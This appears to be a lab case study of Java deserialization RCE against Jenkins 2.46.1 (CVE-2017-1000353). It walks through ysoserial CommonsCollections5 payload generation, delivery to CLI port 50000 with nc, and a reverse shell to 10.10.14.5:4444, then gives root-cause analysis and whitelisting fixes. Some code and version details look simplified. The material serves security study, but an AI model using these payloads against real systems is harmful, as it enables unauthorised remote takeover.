# Java Deserialization - Commons Collections Case Study

## Environment

**Host OS**: Kali Linux 2024.1
**VM/Container**: Docker
**Application**: Jenkins 2.46.1
**URL**: http://192.168.1.10:8080
**CLI Port**: 50000 (accepts serialized objects)
**Database**: N/A
**Source Code**: https://github.com/jenkinsci/jenkins (tag jenkins-2.46.1)

**Dependencies**:
- Apache Commons Collections 3.2.1
- Java 8
- ysoserial-master-SNAPSHOT.jar

---

## Recon

### Entry Points
- HTTP Port 8080: Jenkins web interface
- TCP Port 50000: Jenkins CLI (accepts serialized Java objects without authentication)
- Authentication: Not required for CLI port exploitation

### Source Code Review Focus
1. **Serialization usage**:
   - Search for `ObjectInputStream.readObject()`
   - Identify deserialization without validation
   - Check classpath for Commons Collections

2. **Jenkins CLI Implementation** (`jenkins-core/src/main/java/hudson/cli/`):
   ```java
   // CLICommand.java - vulnerable pattern
   protected Object readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
       return ois.readObject(); // No validation!
   }
   ```

3. **Render Locations**:
   - CLI port directly processes serialized objects
   - No web UI rendering required
   - Binary protocol (not HTTP)

### Vulnerable Code Pattern
```java
// hudson/cli/PlainCLIProtocol.java (simplified)
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Command cmd = (Command) ois.readObject(); // VULNERABLE
cmd.execute();
```

---

## Vulnerability Hypothesis

### Suspected Vulnerability Class
**Insecure Deserialization** - CWE-502

Java applications that deserialize untrusted data are vulnerable to remote code execution when:
1. Application uses `ObjectInputStream.readObject()` on untrusted input
2. Classpath contains "gadget" libraries (Commons Collections, Spring, ROME)
3. No input validation or class whitelisting

### Data Flow
```
Attacker → TCP:50000 → Jenkins CLI → ObjectInputStream.readObject() →
CommonsCollections Gadget Chain → InvokerTransformer.transform() →
Runtime.exec() → RCE
```

### Preconditions
1. Jenkins CLI port (50000) must be accessible
2. Commons Collections library in classpath (default in Jenkins ≤2.46.1)
3. No deserialization filtering (pre-Java 9)

---

## Chain Outline

### Step 1: Identify Deserialization Endpoint
```bash
# Check if CLI port is open
nmap -p 50000 192.168.1.10

# Test connectivity
nc -zv 192.168.1.10 50000
```

### Step 2: Confirm Java Environment
```bash
# Check Jenkins version (web UI)
curl http://192.168.1.10:8080 | grep "Jenkins"

# Identify Java application server
curl -I http://192.168.1.10:8080 | grep "Server:"
# Output: Server: Jetty(9.2.z-SNAPSHOT)
```

### Step 3: Generate ysoserial Payload
```bash
# Generate CommonsCollections5 payload for ping callback
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 \
  "ping -c 4 10.10.14.5" > payload.bin

# Verify payload (Java serialization magic bytes: AC ED 00 05)
xxd payload.bin | head -n 1
# Output: 00000000: aced 0005 ...
```

### Step 4: Deliver Payload to CLI Port
```bash
# Send raw serialized object to Jenkins CLI
cat payload.bin | nc 192.168.1.10 50000

# Alternative: Use ysoserial-exploit (automates exploit)
java -cp ysoserial.jar exploit.JRMPClient 192.168.1.10 50000 CommonsCollections5 "ping -c 4 10.10.14.5"
```

### Step 5: Verify RCE
```bash
# Monitor for ICMP packets on attacker machine
sudo tcpdump -i eth0 icmp and src 192.168.1.10

# Successful output:
# 12:34:56.789012 IP 192.168.1.10 > 10.10.14.5: ICMP echo request
# 12:34:56.789123 IP 192.168.1.10 > 10.10.14.5: ICMP echo request
```

### Step 6: Escalate to Reverse Shell
```bash
# Generate reverse shell payload
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" > shell.bin

# Start listener
nc -lvnp 4444

# Deliver payload
cat shell.bin | nc 192.168.1.10 50000

# Receive shell connection
# jenkins@hostname:/var/jenkins_home$
```

### Alternative: HTTP Endpoint (if present)
Some applications also accept serialized objects via HTTP:
```bash
# Generate base64-encoded payload
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0 > payload.b64

# Send via HTTP POST
curl -X POST http://192.168.1.10:8080/deserialize \
  -d "object=$(cat payload.b64)"
```

---

## Evidence

### Screenshots
- `Screenshots/01-nmap-cli-port.png` - Port scan showing 50000 open
- `Screenshots/02-jenkins-version.png` - Jenkins 2.46.1 web interface
- `Screenshots/03-payload-generation.png` - ysoserial command output
- `Screenshots/04-tcpdump-ping-callback.png` - ICMP packets received
- `Screenshots/05-reverse-shell.png` - Interactive shell session

### Logs
- `Logs/exploitation.log` - Full PoC execution output
- `Logs/tcpdump.pcap` - Network capture showing callbacks
- `Logs/jenkins-errors.log` - Jenkins error logs (may show ClassNotFoundException)

### Artifacts
- `Archives/payload.bin` - Raw ysoserial payload
- `Archives/payload.b64` - Base64-encoded payload
- `Archives/jenkins-cli.jar` - Jenkins CLI client (for analysis)

---

## Findings

### Root Cause Analysis

**Vulnerability Location**: `hudson/cli/CLICommand.java:readObject()`

**Vulnerable Code**:
```java
// No validation before deserialization
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject(); // Triggers gadget chain execution
}
```

**Why This Happened**:
1. Jenkins CLI accepted serialized Java objects without authentication
2. No class whitelist or deserialization filtering
3. Commons Collections 3.2.1 present in classpath
4. `InvokerTransformer` class allows arbitrary method invocation during deserialization

**Gadget Chain Breakdown** (CommonsCollections5):
```java
// Simplified view of execution flow
ConstantTransformer("Runtime")
  → ChainedTransformer([
      InvokerTransformer("getMethod", ["getRuntime", null]),
      InvokerTransformer("invoke", [null, null]),
      InvokerTransformer("exec", ["ping -c 4 10.10.14.5"])
    ])
  → Runtime.getRuntime().exec("ping -c 4 10.10.14.5")
```

### Impact Assessment
- **Severity**: Critical (CVSS 9.8)
- **Authentication Required**: No
- **User Interaction**: No
- **Attack Complexity**: Low (ysoserial automates exploitation)
- **Impact**: Complete system compromise (RCE as Jenkins user)

### Recommended Fixes

**Immediate (Patch)**:
1. Update Jenkins to 2.47+ (implements deserialization whitelist)
2. Remove or restrict access to CLI port (50000)
3. Update Commons Collections to 3.2.2 or 4.1+

**Long-term (Secure Code)**:
```java
// Implement safe deserialization with class whitelisting
class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "hudson.cli.Command",
        "java.lang.String",
        // ... whitelist specific classes only
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException(
                "Deserialization of " + desc.getName() + " not allowed"
            );
        }
        return super.resolveClass(desc);
    }
}
```

**Defense in Depth**:
- Use JSON/XML instead of Java serialization for data exchange
- Apply principle of least privilege (run Jenkins as non-root)
- Network segmentation (firewall CLI port from untrusted networks)
- Implement application-level logging for deserialization attempts

---

## References

- **CVE-2017-1000353**: Jenkins CLI Deserialization
- **ysoserial**: https://github.com/frohoff/ysoserial
- **Jenkins Security Advisory**: https://jenkins.io/security/advisory/2017-04-26/
- **Deserialization Cheat Sheet**: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
